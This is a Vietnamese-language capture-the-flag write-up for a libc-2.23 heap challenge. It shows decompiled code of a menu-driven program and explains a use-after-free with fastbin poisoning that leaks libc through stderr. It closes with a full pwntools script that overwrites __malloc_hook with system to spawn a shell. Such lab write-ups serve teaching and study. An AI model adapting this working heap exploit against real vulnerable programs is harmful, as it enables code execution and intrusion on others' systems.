# Chall1 - Libc-2.23

trước đó mình có giải bài này với libc-2.31 rồi, các bạn có thể tham khảo ở đây:

https://github.com/gookoosss/CTF/blob/main/PWN/training/heap/Double%20Free.md

## Ida
```c 
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  char v3; // [rsp+Fh] [rbp-11h] BYREF
  int v4; // [rsp+10h] [rbp-10h] BYREF
  _DWORD size[3]; // [rsp+14h] [rbp-Ch] BYREF

  *(_QWORD *)&size[1] = __readfsqword(0x28u);
  init(argc, argv, envp);
  puts("Ebook v1.0 - Beta version\n");
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        menu();
        __isoc99_scanf("%d", &v4);
        __isoc99_scanf("%c", &v3);
        if ( v4 != 1 )
          break;
        printf("Size: ");
        __isoc99_scanf("%u", size);
        __isoc99_scanf("%c", &v3);
        ptr = malloc(size[0]);
        printf("Content: ");
        read(0, ptr, size[0]);
        *((_BYTE *)ptr + (unsigned int)(size[0] - 1)) = 0;
      }
      if ( v4 == 2 )
        break;
      switch ( v4 )
      {
        case 3:
          if ( ptr )
          {
            free(ptr);
            puts("Done!");
          }
          else
          {
LABEL_15:
            puts("You didn't buy any book");
          }
          break;
        case 4:
          if ( !ptr )
            goto LABEL_15;
          printf("Content: %s\n", (const char *)ptr);
          break;
        case 5:
          exit(0);
        default:
          puts("Invalid choice!");
          break;
      }
    }
    if ( !ptr )
      goto LABEL_15;
    printf("Content: ");
    read(0, ptr, size[0]);
    *((_BYTE *)ptr + (unsigned int)(size[0] - 1)) = 0;
  }
}
```

## Analysis

- tương tự như bài trước chỉ khác libc
- vì là libc-2.23 nên ko có tcache, khả năng cao bài ta không thể dùng dbf rồi
- không dùng unsorted bin để leak libc được, ta dùng uaf để leak nó
- Với libc-2.23 thì không có tcache do đó khi free chunk được đưa vào fastbin.
- Khi malloc 1 chunk ở fastbin thì ta cần lưu ý rằng size của chunk đó là hợp lệ(nó sẽ so sánh size của chunk và fast bins của thỏa mãn không) và khi free 1 chunk thì chunk được free nextsize phải khác 0 

![image](https://github.com/gookoosss/CTF/assets/128712571/7cbf6a58-3afc-41f9-88aa-16394703e5f6)


- như bài trước thì ta ow free_hook thành system và lấy shell, ta thử check xem 

![image](https://github.com/gookoosss/CTF/assets/128712571/b0dfe947-d844-42e0-8529-ebad19e0cded)


- ta đã thấy thì trong free_hook hoàn toàn trống trơn, mà khi malloc trong fast bin nó sẽ check size => chuyển hướng sang ow malloc_hook
- địa chỉ malloc_hook - 35 sẽ cho ta 1 cái size giả là 0x7f, lúc này sẽ thỏa mãn với fast bin 0x70

![image](https://github.com/gookoosss/CTF/assets/128712571/35c2a9eb-51b6-455e-a605-42ed58512b85)



## Exploit

- đầu tiên ta cần leak libc trước, như bài trước thì ta dùng stderr vì stderr thuộc phân vùng ghi được cũng như chứa libc, ta có thể cấp phát vào nó để leak libc
- nhưng mà cần phải tìm 1 địa chỉ thỏa mãn fast bin đã, may mắn cho ta là stderr - 19 thỏa mãn điều này

![image](https://github.com/gookoosss/CTF/assets/128712571/3e0f0eb3-cc14-4f5e-9b36-ec5cf87c173f)


- sau đó thì sử dụng uaf để leak libc thôi

```python 
# leak_libc

size = 0x70 - 8 # fast bins = 0x70
add(size, b'a' *8)
delete()
edit(p64(exe.sym['stderr'] - 19)) # size == 0x7f, add to fast bin 0x70
add(size, b'a' *8)
add(size, b'abc')
show()
p.recvuntil(b'abc')
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x39c540
print(hex(libc_leak))
print(hex(libc.address))
```
- có được leak libc rồi , ta sẽ set 2 size cho 2 chunk là stderr + 5 (0x404045 ) và fake chunk(0x4040a0) là  0x31 và 0x41

![image](https://github.com/gookoosss/CTF/assets/128712571/8ef0283c-8c24-4a39-82d1-505f371656d1)


![image](https://github.com/gookoosss/CTF/assets/128712571/87609edf-cfe5-4690-86ac-f63326656795)



```python 
# set size stderr+5 and fake chunk
ptr = 0x404058
sym_size = 0x404050
payload = b'\x31' + b'\x00'*18 + b'\0' * 8 + p64(exe.sym['stderr']) # set ptr == stderr
payload = payload.ljust(91, b'a')
payload += p64(0x41)
edit(payload)

# add stderr + 5 to fast bins 0x30
add(32, b'a'*8)
delete()
edit(p64(exe.sym['stdin'] + 5))
add(32, b'a' * 8)

# add fake chunk to fast bins 0x40
add(48, b'a'*8)
delete()
edit(p64(0x4040a0 - 0x10))
add(48, b'a'*8)
```

![image](https://github.com/gookoosss/CTF/assets/128712571/fae3a9c7-d539-4571-8e3a-b4b6554cecf4)



- chunk stderr + 5 dùng để thay đổi ptr, còn fake chunk dùng để gán /bin/sh\0 và thay đổi nextsize cho biến Size
- lúc này ta sẽ set presize cho Size là 0x71, nextsize là gì cũng được nên ta chọn 0x101, còn thg ptr ta sẽ gán Size vào để free(Size)

![image](https://github.com/gookoosss/CTF/assets/128712571/29650d5a-ef57-4559-8fb6-d106438e3666)


![image](https://github.com/gookoosss/CTF/assets/128712571/876823b4-0abc-43bc-9cc5-778bd566e0aa)


- sau khi free(size) xong thì ta tạo được được 1 chunk trong fastbins 0x70, sử dụng uaf để tạo chunk mallc_hook - 35 như phân tích ở trên 

![image](https://github.com/gookoosss/CTF/assets/128712571/44ebbf5a-098c-4ed0-93e5-7e947de7b1c3)


- sau đó ta overwrite malloc_hook thành system để get shell

```python 
# ow malloc_hook
edit(p64(libc.sym['__malloc_hook'] - 35))
add(size, b'a' * 8)
add(size, b'\0' * 19 + p64(libc.sym['system']))
```
- để set rdi là /bin/sh thì ta dùng cái fake chunk(0x4040a0) ta tạo ở trên và malloc size 0x4040a0

![image](https://github.com/gookoosss/CTF/assets/128712571/2f2553ac-3751-425a-ac3d-7967de75cf5b)


```python
# get shell
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Size: ', str(0x4040a0))
```

- lúc này ta đã lấy shell rồi

![image](https://github.com/gookoosss/CTF/assets/128712571/66a0c65d-28d1-4d67-9a14-a2bc819a48a4)



## script

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall1_patched")
libc = ELF("./libc-2.23.so")
ld = ELF("./ld-2.23.so")

context.binary = exe


p = process([exe.path])

gdb.attach(p, gdbscript = '''
b*main+407
b*main+329
b*main+192
b*main+241
b*main+488
c
''')
           
input()

def add(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size))
    p.sendafter(b'Content: ', data)

def edit(data):
    p.sendlineafter(b'> ', b'2')
    p.sendafter(b'Content: ', data)

def delete():
    p.sendlineafter(b'> ', b'3')
    
def show():
    p.sendlineafter(b'> ', b'4')

# leak_libc

size = 0x70 - 8 # fast bins = 0x70
add(size, b'a' *8)
delete()
edit(p64(exe.sym['stderr'] - 19)) # size == 0x7f, add to fast bin 0x70
add(size, b'a' *8)
add(size, b'abc')
show()
p.recvuntil(b'abc')
libc_leak = u64(p.recv(6) + b'\0\0')
libc.address = libc_leak - 0x39c540
print(hex(libc_leak))
print(hex(libc.address))

# set size stderr+5 and fake chunk
ptr = 0x404058
sym_size = 0x404050
payload = b'\x31' + b'\x00'*18 + b'\0' * 8 + p64(exe.sym['stderr']) # set ptr == stderr
payload = payload.ljust(91, b'a')
payload += p64(0x41)
edit(payload)

# add stderr + 5 to fast bins 0x30
add(32, b'a'*8)
delete()
edit(p64(exe.sym['stdin'] + 5))
add(32, b'a' * 8)

# add fake chunk to fast bins 0x40
add(48, b'a'*8)
delete()
edit(p64(0x4040a0 - 0x10))
add(48, b'a'*8)

# set /bin/sh to fake chunk and set nextsize Size
add(48, b'/bin/sh\0' + b'\0'*16 + p64(0x101))

# set ptr == size and free(size)
payload = b'\0'*3 + p64(0x71) + b'\x00'*8  + p64(exe.sym['size'])
add(32, payload)
delete()

# ow malloc_hook
edit(p64(libc.sym['__malloc_hook'] - 35))
add(size, b'a' * 8)
add(size, b'\0' * 19 + p64(libc.sym['system']))


# get shell
p.sendlineafter(b'> ', b'1')
p.sendlineafter(b'Size: ', str(0x4040a0))

p.interactive()
```
